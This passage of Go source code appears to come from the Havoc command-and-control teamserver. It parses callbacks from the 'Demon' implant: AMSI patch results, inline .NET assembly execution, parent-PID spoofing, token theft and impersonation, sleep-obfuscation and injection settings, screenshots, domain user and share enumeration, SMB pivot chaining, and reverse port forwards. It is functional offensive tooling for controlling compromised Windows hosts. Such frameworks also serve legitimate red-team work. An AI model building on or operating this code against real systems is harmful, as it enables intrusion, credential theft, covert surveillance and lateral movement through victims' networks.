				Status = Parser.ParseInt32()
			)

			Message["Type"] = "Error"
			Message["Message"] = fmt.Sprintf("Failed to execute object file [%v]", Status)
			break

		case ERROR_TOKEN:
			var Status = Parser.ParseInt32()

			switch Status {
			case 0x1:
				Message["Type"] = "Error"
				Message["Message"] = "No tokens inside the token vault"
				break
			}
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

	case COMMAND_ASSEMBLY_INLINE_EXECUTE:
		var (
			InfoID  = Parser.ParseInt32()
			Message = make(map[string]string)
		)

		switch InfoID {
		case DOTNET_INFO_AMSI_PATCHED:

			switch Parser.ParseInt32() {
			case 0:
				Message["Type"] = "Good"
				Message["Message"] = "Successfully Patched Amsi"

				break
			case 1:
				Message["Type"] = "Error"
				Message["Message"] = "Failed to patch Amsi"

				break
			case 2:
				Message["Type"] = "Info"
				Message["Message"] = "Amsi already patched"

				break
			}
			break

		case DOTNET_INFO_NET_VERSION:
			Message["Type"] = "Info"
			Message["Message"] = "Using CLR Version: " + string(Parser.ParseBytes())
			break

		case DOTNET_INFO_ENTRYPOINT:
			var ThreadID int

			if Parser.Length() >= 4 {
				ThreadID = Parser.ParseInt32()
				Message = map[string]string{
					"Type":    "Good",
					"Message": fmt.Sprintf("Assembly has been executed [Thread: %d]", ThreadID),
				}
			} else {
				Message = map[string]string{
					"Type":    "Error",
					"Message": fmt.Sprintf("Callback error: DOTNET_INFO_ENTRYPOINT (0x3) expects more or at least 4 bytes but received %d bytes.", Parser.Length()),
				}
			}

		case DOTNET_INFO_FINISHED:

			Message = map[string]string{
				"Type":    "Good",
				"Message": "Finished executing assembly.",
			}

			break

		case DOTNET_INFO_FAILED:

			Message = map[string]string{
				"Type":    "Error",
				"Message": "Failed to execute assembly or initialize the clr",
			}

			break

		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case COMMAND_ASSEMBLY_LIST_VERSIONS:
		var Output string
		var Message = make(map[string]string)

		for Parser.Length() != 0 {
			Output += fmt.Sprintf("   - %v\n", string(Parser.ParseBytes()))
		}

		Message["Type"] = typeInfo
		Message["Message"] = "List available assembly versions:"
		Message["Output"] = Output

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case COMMAND_PROC_PPIDSPOOF:
		var (
			Ppid    = int(Parser.ParseInt32())
			Message = make(map[string]string)
		)

		Message["Type"] = typeGood
		Message["Message"] = "Changed parent pid to spoof: " + strconv.Itoa(Ppid)

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case COMMAND_TOKEN:

		if Parser.Length() >= 4 {
			var (
				SubCommand = Parser.ParseInt32()
				Output     = make(map[string]string)
			)

			switch SubCommand {

			case 0x1: // impersonate
				var (
					Successful = Parser.ParseInt32()
					User       = Parser.ParseBytes()
				)

				if Successful == win32.TRUE {
					Output["Type"] = typeGood
					Output["Message"] = fmt.Sprintf("Successful impersonated %s", User)
				} else {
					Output["Type"] = typeError
					Output["Message"] = fmt.Sprintf("Failed to impersonat %s", User)
				}

				break

			case 0x2: // steal
				var (
					User      = string(Parser.ParseBytes())
					TokenID   = Parser.ParseInt32()
					TargetPID = Parser.ParseInt32()
				)

				Output["Type"] = "Good"
				Output["Message"] = fmt.Sprintf("Successful stole token from %v User:[%v] TokenID:[%v]", TargetPID, User, TokenID)

				break

			case 0x3: // list
				var (
					Buffer    string
					FmtString string
					Array     [][]any
					MaxString int
				)

				for Parser.Length() != 0 {
					var (
						TokenIndex    = Parser.ParseInt32()
						Handle        = fmt.Sprintf("0x%x", Parser.ParseInt32())
						DomainAndUser = string(Parser.ParseBytes())
						ProcessID     = Parser.ParseInt32()
						Type          = Parser.ParseInt32()
					)

					Array = append(Array, []any{TokenIndex, Handle, DomainAndUser, ProcessID, Type})

					if len(DomainAndUser) > MaxString {
						MaxString = len(DomainAndUser)
					}
				}

				FmtString = fmt.Sprintf(" %%-4v  %%-6v  %%-%vv  %%-4v  %%-4v\n", MaxString)

				Buffer += fmt.Sprintf(FmtString, " ID ", "Handle", "Domain\\User", "PID", "Type")
				Buffer += fmt.Sprintf(FmtString, "----", "------", "-----------", "---", "----")

				for _, item := range Array {

					logger.Debug(fmt.Sprintf("item[4]: %v", item[4]))

					if item[4] == 0x1 {
						item[4] = "stolen"
					} else if item[4] == 0x2 {
						item[4] = "make (local)"
					} else if item[4] == 0x3 {
						item[4] = "make (network)"
					} else {
						item[4] = "unknown"
					}

					Buffer += fmt.Sprintf(FmtString, item[0], item[1], item[2], item[3], item[4])
				}

				Output["Type"] = "Info"
				Output["Message"] = "Token Vault:"
				Output["Output"] = "\n" + Buffer

				break

			case 0x4: // privs get or list
				var (
					PrivList     = Parser.ParseInt32()
					OutputBuffer bytes.Buffer
					TableData    [][]string
				)

				if PrivList == win32.TRUE {
					if Parser.Length() > 0 {

						table := tablewriter.NewWriter(&OutputBuffer)

						table.SetBorder(false)
						table.SetHeaderAlignment(tablewriter.ALIGN_CENTER)

						table.SetRowSeparator(" ")
						table.SetColumnSeparator("::")
						table.SetCenterSeparator(" ")

						for Parser.Length() != 0 {
							var (
								Column    []string
								Privilege string
								StateInt  int
								State     string
							)

							Privilege = string(Parser.ParseBytes())
							StateInt = Parser.ParseInt32()

							if StateInt == 3 {
								State = "Enabled"
							} else if StateInt == 2 {
								State = "Adjusted"
							} else if StateInt == 0 {
								State = "Disabled"
							} else {
								State = "Unknown"
							}

							Column = []string{Privilege, State}
							TableData = append(TableData, Column)
						}
						table.AppendBulk(TableData)
						table.Render()

						Output["Type"] = "Good"
						Output["Message"] = "List Privileges for current Token:"
						Output["Output"] = "\n" + OutputBuffer.String()
					} else {
						Output["Type"] = "Error"
						Output["Message"] = "Failed to list privileges current token"
					}
				} else {
					// TODO: finish this
					if Parser.Length() > 0 {
						Output["Type"] = "Good"
						Output["Message"] = "Get Privilege for current Token:"
					} else {
						Output["Type"] = "Error"
						Output["Message"] = "Failed to get privilege current token"
					}
				}
				break

			case 0x5: // make
				if Parser.Length() > 0 {
					Output["Type"] = "Good"
					Output["Message"] = fmt.Sprintf("Successful created token: " + string(Parser.ParseBytes()))
				} else {
					Output["Type"] = "Error"
					Output["Message"] = fmt.Sprintf("Failed to create token")
				}
				break

			case 0x6: // getuid
				var (
					Elevated = Parser.ParseInt32()
					User     = string(Parser.ParseBytes())
				)

				Output["Type"] = typeGood
				if Elevated == 0 {
					Output["Message"] = fmt.Sprintf("Token User: %v", User)
				} else {
					Output["Message"] = fmt.Sprintf("Token User: %v (Admin)", User)
				}

				break

			case 0x7: // revert
				var Successful = Parser.ParseInt32()

				if Successful == win32.TRUE {
					Output["Type"] = typeGood
					Output["Message"] = "Successful reverted token to itself"
				} else {
					Output["Type"] = typeError
					Output["Message"] = "Failed to revert token to itself"
				}

				break

			case 0x8: // remove
				var (
					Successful = Parser.ParseInt32()
					TokenID    = Parser.ParseInt32()
				)

				if Successful == win32.TRUE {
					Output["Type"] = typeGood
					Output["Message"] = fmt.Sprintf("Successful removed token [%v] from vault", TokenID)
				} else {
					Output["Type"] = typeError
					Output["Message"] = fmt.Sprintf("Failed to remove token [%v] from vault", TokenID)
				}

				break

			case 0x9: // clear

				Output["Type"] = typeGood
				Output["Message"] = "Token vault has been cleared"

				break
			}

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
		}
		break

	case COMMAND_CONFIG:
		var (
			Message = make(map[string]string)

			Config     int
			ConfigData any
		)

		Config = Parser.ParseInt32()
		Message["Type"] = "Good"

		if Parser.Length() >= 4 {
			switch Config {

			case CONFIG_MEMORY_ALLOC:
				ConfigData = Parser.ParseInt32()
				Message["Message"] = fmt.Sprintf("Default memory allocation set to %v", ConfigData.(int))
				break

			case CONFIG_MEMORY_EXECUTE:
				ConfigData = Parser.ParseInt32()
				Message["Message"] = fmt.Sprintf("Default memory executing set to %v", ConfigData.(int))
				break

			case CONFIG_INJECT_SPAWN64:
				ConfigData = string(Parser.ParseBytes())
				Message["Message"] = "Default x64 target process set to " + ConfigData.(string)
				break

			case CONFIG_INJECT_SPAWN32:
				ConfigData = string(Parser.ParseBytes())
				Message["Message"] = "Default x86 target process set to " + ConfigData.(string)
				break

			case CONFIG_IMPLANT_SPFTHREADSTART:
				ConfigData = string(Parser.ParseBytes()) + "!" + string(Parser.ParseBytes())
				Message["Message"] = "Sleep obfuscation spoof thread start addr to " + ConfigData.(string)
				break

			case CONFIG_IMPLANT_SLEEP_TECHNIQUE:
				ConfigData = Parser.ParseInt32()
				Message["Message"] = fmt.Sprintf("Sleep obfuscation technique set to %v", ConfigData.(int))
				break

			case CONFIG_IMPLANT_COFFEE_VEH:
				ConfigData = Parser.ParseInt32()
				if ConfigData.(int) == 0 {
					ConfigData = "false"
				} else {
					ConfigData = "true"
				}
				Message["Message"] = fmt.Sprintf("Coffee VEH set to %v", ConfigData.(string))
				break

			case CONFIG_IMPLANT_COFFEE_THREADED:
				ConfigData = Parser.ParseInt32()
				if ConfigData.(int) == 0 {
					ConfigData = "false"
				} else {
					ConfigData = "true"
				}
				Message["Message"] = fmt.Sprintf("Coffee threading set to %v", ConfigData.(string))
				break

			case CONFIG_INJECT_TECHNIQUE:
				ConfigData = strconv.Itoa(Parser.ParseInt32())
				Message["Message"] = "Set default injection technique to " + ConfigData.(string)
				break

			case CONFIG_INJECT_SPOOFADDR:
				ConfigData = string(Parser.ParseBytes()) + "!" + string(Parser.ParseBytes())
				Message["Message"] = "Injection thread spoofing value set to " + ConfigData.(string)
				break

			case CONFIG_IMPLANT_VERBOSE:
				ConfigData = Parser.ParseInt32()

				if ConfigData.(int) == 0 {
					ConfigData = "false"
				} else {
					ConfigData = "true"
				}

				Message["Message"] = fmt.Sprintf("Implant verbose messaging: %v", ConfigData.(string))
				break

			default:
				Message["Type"] = "Error"
				Message["Message"] = "Error while setting certain config"
				break
			}
		} else {
			Message["Type"] = "Error"
			Message["Message"] = "Error while setting certain config"
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case COMMAND_SCREENSHOT:
		var (
			Success = Parser.ParseInt32()
			Message = make(map[string]string)
		)

		if Success == 1 {
			var BmpBytes = Parser.ParseBytes()
			var Name = "Desktop_" + time.Now().Format("02.01.2006-05.04.05") + ".png"

			if len(BmpBytes) > 0 {
				err := logr.LogrInstance.DemonSaveScreenshot(a.NameID, Name, BmpBytes)
				if err != nil {
					Message["Type"] = "Error"
					Message["Message"] = "Failed to take a screenshot: " + err.Error()
					return
				}

				Message["Type"] = "Good"
				Message["Message"] = "Successful took screenshot"

				Message["MiscType"] = "screenshot"
				Message["MiscData"] = base64.StdEncoding.EncodeToString(BmpBytes)
				Message["MiscData2"] = Name
			} else {
				Message["Type"] = "Error"
				Message["Message"] = "Failed to take a screenshot"
			}
		} else {
			Message["Type"] = "Error"
			Message["Message"] = "Failed to take a screenshot"
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case COMMAND_NET:
		var (
			NetCommand = Parser.ParseInt32()
			Message    = make(map[string]string)
		)

		switch NetCommand {

		case DEMON_NET_COMMAND_DOMAIN:
			var Domain = string(Parser.ParseBytes())
			Message["Type"] = "Good"
			Message["Message"] = "Domain for this Host: " + Domain
			break

		case DEMON_NET_COMMAND_LOGONS:
			var (
				Index  int
				Output string
			)

			if Parser.Length() > 0 {
				var Domain = string(Parser.ParseBytes())
				Output += fmt.Sprintf(" %-12s\n", "Usernames")
				Output += fmt.Sprintf(" %-12s\n", "---------")
				for Parser.Length() != 0 {
					var Name = string(Parser.ParseBytes())

					Index++

					Output += fmt.Sprintf("  %-12s\n", Name)
				}

				Message["Type"] = "Info"
				Message["Message"] = fmt.Sprintf("Logged on users at %v [%v]: ", Domain, Index)
				Message["Output"] = "\n" + Output
			}

			break

		case DEMON_NET_COMMAND_SESSIONS:
			var (
				Index  int
				Buffer bytes.Buffer
				Data   [][]string
			)

			if Parser.Length() > 0 {
				var Domain = string(Parser.ParseBytes())

				table := tablewriter.NewWriter(&Buffer)

				table.SetBorder(false)
				table.SetHeader([]string{"Computer", "Username", "Active", "Idle"})
				table.SetBorder(false)
				table.SetHeaderAlignment(tablewriter.ALIGN_CENTER)

				// table.SetRowSeparator("-")
				table.SetColumnSeparator(" ")
				table.SetCenterSeparator(" ")

				for Parser.Length() != 0 {
					var (
						Client = string(Parser.ParseBytes())
						User   = string(Parser.ParseBytes())
						Time   = int(Parser.ParseInt32())
						Idle   = int(Parser.ParseInt32())
						Column []string
					)

					Index++

					Column = []string{Client, User, strconv.Itoa(Time), strconv.Itoa(Idle)}
					Data = append(Data, Column)
				}

				table.AppendBulk(Data)
				table.Render()

				Message["Type"] = "Info"
				Message["Message"] = fmt.Sprintf("Sessions for %v [%v]: ", Domain, Index)
				Message["Output"] = "\n" + Buffer.String()
			}
			break

		case DEMON_NET_COMMAND_COMPUTER:
			break

		case DEMON_NET_COMMAND_DCLIST:
			break

		case DEMON_NET_COMMAND_SHARE:
			var (
				Index  int
				Buffer bytes.Buffer
				Data   [][]string
			)

			if Parser.Length() > 0 {
				var Domain = common.DecodeUTF16(Parser.ParseBytes())

				table := tablewriter.NewWriter(&Buffer)

				table.SetBorder(false)
				table.SetHeader([]string{"Share name", "Path", "Remark", "Access"})
				table.SetBorder(false)
				table.SetHeaderAlignment(tablewriter.ALIGN_CENTER)

				// table.SetRowSeparator("-")
				table.SetColumnSeparator(" ")
				table.SetCenterSeparator(" ")

				for Parser.Length() != 0 {
					var (
						Name   = common.DecodeUTF16(Parser.ParseBytes())
						Path   = common.DecodeUTF16(Parser.ParseBytes())
						Remark = common.DecodeUTF16(Parser.ParseBytes())
						Access = int(Parser.ParseInt32())

						Column []string
					)

					Index++

					Column = []string{Name, Path, Remark, strconv.Itoa(Access)}
					Data = append(Data, Column)
				}

				table.AppendBulk(Data)
				table.Render()

				Message["Type"] = "Info"
				Message["Message"] = fmt.Sprintf("Shares for %v [%v]: ", Domain, Index)
				Message["Output"] = "\n" + Buffer.String()
			}
			break

		case DEMON_NET_COMMAND_LOCALGROUP:
			var Data string

			if Parser.Length() > 0 {
				var Domain = common.DecodeUTF16(Parser.ParseBytes())

				Data += fmt.Sprintf(" %-48s %s\n", "Group", "Description")
				Data += fmt.Sprintf(" %-48s %s\n", "-----", "-----------")

				for Parser.Length() != 0 {
					var (
						Group       = string(Parser.ParseBytes())
						Description = string(Parser.ParseBytes())
					)

					Data += fmt.Sprintf(" %-48s  %s\n", Group, Description)
				}

				Message["Type"] = "Info"
				Message["Message"] = fmt.Sprintf("Local Groups for %v: ", Domain)
				Message["Output"] = "\n" + Data
			}
			break

		case DEMON_NET_COMMAND_GROUP:
			var Data string

			if Parser.Length() > 0 {
				var Domain = string(Parser.ParseBytes())

				if Parser.Length() > 0 {
					Data += fmt.Sprintf(" %-48s %s\n", "Group", "Description")
					Data += fmt.Sprintf(" %-48s %s\n", "-----", "-----------")

					for Parser.Length() != 0 {
						var (
							Group       = string(Parser.ParseBytes())
							Description = string(Parser.ParseBytes())
						)

						Data += fmt.Sprintf(" %-48s  %s\n", Group, Description)
					}
				}

				Message["Type"] = "Info"
				Message["Message"] = fmt.Sprintf("List groups on %v: ", Domain)
				Message["Output"] = "\n" + Data
			}
			break

		case DEMON_NET_COMMAND_USERS:
			var Data string

			if Parser.Length() > 0 {
				var Target = string(Parser.ParseBytes())

				for Parser.Length() != 0 {
					var (
						User  = string(Parser.ParseBytes())
						Admin = Parser.ParseInt32()
					)

					if Admin == win32.TRUE {
						Data += fmt.Sprintf(" - %s (Admin)\n", User)
					} else {
						Data += fmt.Sprintf(" - %s \n", User)
					}
				}

				Message["Type"] = "Info"
				Message["Message"] = fmt.Sprintf("Users on %v: ", Target)
				Message["Output"] = "\n" + Data
			}
			break
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case COMMAND_PIVOT:
		var (
			PivotCommand = Parser.ParseInt32()
			Message      = make(map[string]string)
		)

		switch PivotCommand {
		case DEMON_PIVOT_LIST:
			var (
				Data  string
				Count int
			)

			Data += fmt.Sprintf(" %-10s %s\n", "DemonID ", "Named Pipe")
			Data += fmt.Sprintf(" %-10s %s\n", "--------", "-----------")

			for Parser.Length() != 0 {
				var (
					DemonId   int
					NamedPipe string
				)

				if Parser.Length() > 4 {
					DemonId = Parser.ParseInt32()
				}

				if Parser.Length() > 4 {
					NamedPipe = string(Parser.ParseBytes())
				}

				Data += fmt.Sprintf(" %-10x  %s\n", DemonId, NamedPipe)
				Count++
			}

			if Count > 0 {
				Message["Type"] = "Info"
				Message["Message"] = fmt.Sprintf("Pivot List [%v]: ", Count)
				Message["Output"] = "\n" + Data
			} else {
				Message["Type"] = "Error"
				Message["Message"] = fmt.Sprintf("No pivots connected")
			}

		case DEMON_PIVOT_SMB_CONNECT:
			var Success = Parser.ParseInt32()

			// if we successfully connected to the SMB named pipe
			if Success == 1 {

				if Parser.Length() > 0 {

					var (
						DemonData = Parser.ParseBytes()
						AgentHdr  Header
						err       error
					)

					// parse the agent header
					if AgentHdr, err = ParseHeader(DemonData); err == nil {

						if AgentHdr.MagicValue == DEMON_MAGIC_VALUE {
							AgentHdr.Data.ParseInt32()

							var DemonInfo *Agent

							// if agent exist then just retrieve the instance by agent id
							if teamserver.AgentExist(AgentHdr.AgentID) {

								DemonInfo = teamserver.AgentInstance(AgentHdr.AgentID)
								Message["MiscType"] = "reconnect"
								Message["MiscData"] = fmt.Sprintf("%v;%x", a.NameID, AgentHdr.AgentID)

								for i := range DemonInfo.Pivots.Parent.Pivots.Links {
									if DemonInfo.Pivots.Parent.Pivots.Links[i].NameID == fmt.Sprintf("%x", AgentHdr.AgentID) {
										DemonInfo.Pivots.Parent.Pivots.Links = append(DemonInfo.Pivots.Parent.Pivots.Links[:i], DemonInfo.Pivots.Parent.Pivots.Links[i+1:]...)
										break
									}
								}

								DemonInfo.Pivots.Parent = a

								a.Pivots.Links = append(a.Pivots.Links, DemonInfo)

							} else {
								// if the agent doesn't exist then we assume that it's a register request from a new agent

								DemonInfo = ParseDemonRegisterRequest(AgentHdr.AgentID, AgentHdr.Data)
								DemonInfo.Pivots.Parent = a

								a.Pivots.Links = append(a.Pivots.Links, DemonInfo)

								DemonInfo.Info.MagicValue = AgentHdr.MagicValue

								teamserver.AgentAdd(DemonInfo)
								teamserver.AgentSendNotify(DemonInfo)

								// start a goroutine that updates the GUI last callback time each second.
								go DemonInfo.BackgroundUpdateLastCallbackUI(teamserver)
							}

							if DemonInfo != nil {
								Message["Type"] = "Good"
								Message["Message"] = "[SMB] Connected to pivot agent [" + a.NameID + "]-<>-<>-[" + DemonInfo.NameID + "]"
							} else {
								Message["Type"] = "Error"
								Message["Message"] = "[SMB] Failed to connect: failed to parse the agent"
							}

						} else {
							Message["Type"] = "Error"
							Message["Message"] = "[SMB] Failed to connect: magic value isn't demon type"
						}

					} else {
						Message["Type"] = "Error"
						Message["Message"] = "[SMB] Failed to connect: " + err.Error()
					}
				} else {
					Message["Type"] = "Error"
					Message["Message"] = "[SMB] Failed to connect: Invalid response"
				}
			} else {
				logger.Debug("DEMON_PIVOT_SMB_CONNECT: Failed")
				var (
					ErrorCode          = Parser.ParseInt32()
					ErrorString, found = Win32ErrorCodes[ErrorCode]
				)

				ErrorString += " "

				if !found {
					ErrorString = ""
				}

				Message["Type"] = "Error"
				Message["Message"] = fmt.Sprintf("[SMB] Failed to connect: %v [%v]", ErrorString, ErrorCode)
			}

			break

		case DEMON_PIVOT_SMB_DISCONNECT:

			if Parser.Length() > 0 {
				var (
					Success = Parser.ParseInt32()
					AgentID = Parser.ParseInt32()
				)

				if Success == win32.TRUE {
					Message["Type"] = "Error"
					Message["Message"] = fmt.Sprintf("[SMB] Agent disconnected %x", AgentID)

					Message["MiscType"] = "disconnect"
					Message["MiscData"] = fmt.Sprintf("%x", AgentID)

					AgentInstance := teamserver.AgentInstance(AgentID)
					if AgentInstance != nil {
						AgentInstance.Active = false
						AgentInstance.Reason = "Disconnected"
					}

					for i := range a.Pivots.Links {
						if a.Pivots.Links[i].NameID == Message["MiscData"] {
							a.Pivots.Links = append(a.Pivots.Links[:i], a.Pivots.Links[i+1:]...)
							break
						}
					}
				} else {
					Message["Type"] = "Error"
					Message["Message"] = fmt.Sprintf("[SMB] Failed to disconnect agent %x", AgentID)
				}
			}

			break

		case DEMON_PIVOT_SMB_COMMAND:

			if Parser.Length() > 0 {
				var (
					Package       = Parser.ParseBytes()
					AgentHdr, err = ParseHeader(Package)
				)

				if err == nil {

					if AgentHdr.MagicValue == DEMON_MAGIC_VALUE {
						var Command = AgentHdr.Data.ParseInt32()

						found := false
						for i := range a.Pivots.Links {
							if a.Pivots.Links[i].NameID == utils.IntToHexString(AgentHdr.AgentID) {
								a.Pivots.Links[i].TaskDispatch(Command, AgentHdr.Data, teamserver)
								found = true
								break
							}
						}

						if !found {
							Message["Type"] = "Error"
							Message["Message"] = fmt.Sprintf("Can't process output for %x: Agent not found", AgentHdr.AgentID)
						}

					} else {
						Message["Type"] = "Error"
						Message["Message"] = "[SMB] Response magic value isn't demon type"
					}
				} else {
					Message["Type"] = "Error"
					Message["Message"] = "[SMB] Failed to parse agent header: " + err.Error()
				}
			}

			break

		default:
			logger.Debug(fmt.Sprintf("CommandID not found: %x", CommandID))
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case COMMAND_TRANSFER:

		var (
			SubCommand = Parser.ParseInt32()
			Message    map[string]string
		)

		switch SubCommand {

		case 0x0: /* transfer list */
			var (
				Data  string
				Count int
			)

			Data += fmt.Sprintf(" %-8s  %-8s  %-8s  %-8s %s\n", "File ID", "Size", "Progress", "State", "File")
			Data += fmt.Sprintf(" %-8s  %-8s  %-8s  %-8s %s\n", "-------", "----", "--------", "-----", "----")

			for Parser.Length() >= 12 {
				var (
					FileID = Parser.ParseInt32()
					Size   = Parser.ParseInt32()
					State  = Parser.ParseInt32()
				)

				if download := a.DownloadGet(FileID); download != nil {
					var (
						StateString string
						Progress    string
					)

					if State == DOWNLOAD_STATE_RUNNING {
						StateString = "Running"
					} else if State == DOWNLOAD_STATE_STOPPED {
						StateString = "Stopped"
					} else if State == DOWNLOAD_STATE_REMOVE {
						/* pending remove */
						StateString = "Removed"
					}

					Progress = fmt.Sprintf("%.2f%%", common.PercentageChange(Size, download.TotalSize))
					Data += fmt.Sprintf(" %-8x  %-8s  %-8s  %-8s %s\n", FileID, common.ByteCountSI(int64(download.TotalSize)), Progress, StateString, download.FilePath)
					Count++
				}
			}

			Message = map[string]string{
				"Type":    "Info",
				"Message": fmt.Sprintf("List downloads [%v current downloads]:", Count),
				"Output":  "\n" + Data,
			}

			break

		case 0x1: /* transfer stop */

			if Parser.Length() >= 8 {
				var (
					Found  = Parser.ParseInt32()
					FileID = Parser.ParseInt32()
				)

				if Found == win32.TRUE {
					if download := a.DownloadGet(FileID); download != nil {
						Message = map[string]string{
							"Type":    "Good",
							"Message": fmt.Sprintf("Successful found and stopped download: %x", FileID),
						}
					} else {
						Message = map[string]string{
							"Type":    "Error",
							"Message": fmt.Sprintf("Couldn't stop download %x: Download does not exists", FileID),
						}
					}
				} else {
					Message = map[string]string{
						"Type":    "Error",
						"Message": fmt.Sprintf("Couldn't stop download %x: FileID not found", FileID),
					}
				}

			} else {
				Message = map[string]string{
					"Type":    "Error",
					"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_TRANSFER with subcommand 0x1 (stop). Expected at least 8 bytes but received %v bytes", Parser.Length()),
				}
			}

			break

		case 0x2: /* transfer resume */

			if Parser.Length() >= 8 {
				var (
					Found  = Parser.ParseInt32()
					FileID = Parser.ParseInt32()
				)

				if Found == win32.TRUE {
					if download := a.DownloadGet(FileID); download != nil {
						Message = map[string]string{
							"Type":    "Good",
							"Message": fmt.Sprintf("Successful found and resumed download: %x", FileID),
						}
					} else {
						Message = map[string]string{
							"Type":    "Error",
							"Message": fmt.Sprintf("Couldn't resume download %x: Download does not exists", FileID),
						}
					}
				} else {
					Message = map[string]string{
						"Type":    "Error",
						"Message": fmt.Sprintf("Couldn't resume download %x: FileID not found", FileID),
					}
				}

			} else {
				Message = map[string]string{
					"Type":    "Error",
					"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_TRANSFER with subcommand 0x2 (resume). Expected at least 8 bytes but received %v bytes", Parser.Length()),
				}
			}

			break

		case 0x3: /* transfer remove */

			if Parser.Length() >= 8 {
				var (
					Found  = Parser.ParseInt32()
					FileID = Parser.ParseInt32()
				)

				if Found == win32.TRUE {
					if download := a.DownloadGet(FileID); download != nil {
						Message = map[string]string{
							"Type":    "Good",
							"Message": fmt.Sprintf("Successful found and removed download: %x", FileID),
						}
					} else {
						Message = map[string]string{
							"Type":    "Error",
							"Message": fmt.Sprintf("Couldn't remove download %x: Download does not exists", FileID),
						}
					}
				} else {
					Message = map[string]string{
						"Type":    "Error",
						"Message": fmt.Sprintf("Couldn't remove download %x: FileID not found", FileID),
					}
				}

			} else {
				Message = map[string]string{
					"Type":    "Error",
					"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_TRANSFER with subcommand 0x3 (remove). Expected at least 8 bytes but received %v bytes", Parser.Length()),
				}
			}

			break
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case COMMAND_SOCKET:
		var (
			SubCommand = 0
			Message    map[string]string
		)

		if Parser.Length() >= 4 {
			SubCommand = Parser.ParseInt32()

			switch SubCommand {
			case SOCKET_COMMAND_RPORTFWD_ADD:

				if Parser.Length() >= 16 {

					var (
						SocktID = 0
						Success = 0
						LclAddr = 0
						LclPort = 0
						FwdAddr = 0
						FwdPort = 0

						FwdString string
						LclString string
					)

					Success = Parser.ParseInt32()
					SocktID = Parser.ParseInt32()
					LclAddr = Parser.ParseInt32()
					LclPort = Parser.ParseInt32()
					FwdAddr = Parser.ParseInt32()
					FwdPort = Parser.ParseInt32()

					LclString = common.Int32ToIpString(int64(LclAddr))
					FwdString = common.Int32ToIpString(int64(FwdAddr))

					if Success == win32.TRUE {
						a.Console(teamserver.AgentConsole, "Info", fmt.Sprintf("Started reverse port forward on %s:%d to %s:%d [Id: %x]", LclString, LclPort, FwdString, FwdPort, SocktID), "")
						a.Console(teamserver.AgentConsole, "Warn", "Dont forget to go interactive to make it usable", "")

						return
					} else {
						a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to start reverse port forward on %s:%d to %s:%d", LclString, LclPort, FwdString, FwdPort), "")
						return
					}

				} else {
					Message = map[string]string{
						"Type":    "Error",
						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_SOCKET sub-command rportfwd (SOCKET_COMMAND_RPORTFWD_ADD : 0x0) expected at least 16 bytes but received %v bytes", Parser.Length()),
					}
				}

				break

			case SOCKET_COMMAND_RPORTFWD_LIST:

				var (
					FwdList  string
					FwdCount int
				)

				FwdList += "\n"
				FwdList += fmt.Sprintf(" %-12s %s\n", "Socket ID", "Forward")
				FwdList += fmt.Sprintf(" %-12s %s\n", "---------", "-------")

				for Parser.Length() != 0 {
					var (
						SocktID = 0
						LclAddr = 0
						LclPort = 0
						FwdAddr = 0
						FwdPort = 0

						FwdString string
						LclString string
					)

					SocktID = Parser.ParseInt32()
					LclAddr = Parser.ParseInt32()
					LclPort = Parser.ParseInt32()
					FwdAddr = Parser.ParseInt32()
					FwdPort = Parser.ParseInt32()

					LclString = common.Int32ToIpString(int64(LclAddr))
					FwdString = common.Int32ToIpString(int64(FwdAddr))

					FwdList += fmt.Sprintf(" %-12x %s\n", SocktID, fmt.Sprintf("%s:%d -> %s:%d", LclString, LclPort, FwdString, FwdPort))
					FwdCount++
				}

				a.Console(teamserver.AgentConsole, "Info", fmt.Sprintf("reverse port forwards [%d active]:", FwdCount), FwdList)
				return

			case SOCKET_COMMAND_RPORTFWD_REMOVE:

				if Parser.Length() >= 20 {

					var (
						SocktID = 0
						LclAddr = 0
						LclPort = 0
						FwdAddr = 0
						FwdPort = 0

						FwdString string
						LclString string
					)

					SocktID = Parser.ParseInt32()
					LclAddr = Parser.ParseInt32()
					LclPort = Parser.ParseInt32()
					FwdAddr = Parser.ParseInt32()
					FwdPort = Parser.ParseInt32()

					LclString = common.Int32ToIpString(int64(LclAddr))
					FwdString = common.Int32ToIpString(int64(FwdAddr))

					Message = map[string]string{
						"Type":    "Info",
						"Message": fmt.Sprintf("Successful closed and removed rportfwd [SocketID: %x] [Forward: %s:%d -> %s:%d]", SocktID, LclString, LclPort, FwdString, FwdPort),
					}

					/* finally close our port forwarder */
					a.PortFwdClose(SocktID)

				} else {
					Message = map[string]string{
						"Type":    "Info",
						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_SOCKET sub-command rportfwd (SOCKET_COMMAND_RPORTFWD_REMOVE : 0x4) expected at least 20 bytes but received %v bytes", Parser.Length()),
					}
				}

				break

			case SOCKET_COMMAND_RPORTFWD_CLEAR:

				if Parser.Length() >= 4 {

					var Success = Parser.ParseInt32()

					if Success == win32.TRUE {
						Message = map[string]string{
							"Type":    "Good",
							"Message": "Successful closed and removed all rportfwds",
						}
					} else {
						Message = map[string]string{
							"Type":    "Erro",
							"Message": "Failed to closed and remove all rportfwds",
						}
					}
				} else {
					Message = map[string]string{
						"Type":    "Info",
						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_SOCKET sub-command rportfwd (SOCKET_COMMAND_RPORTFWD_CLEAR : 0x3) expected at least 4 bytes but received %v bytes", Parser.Length()),
					}
				}

				break

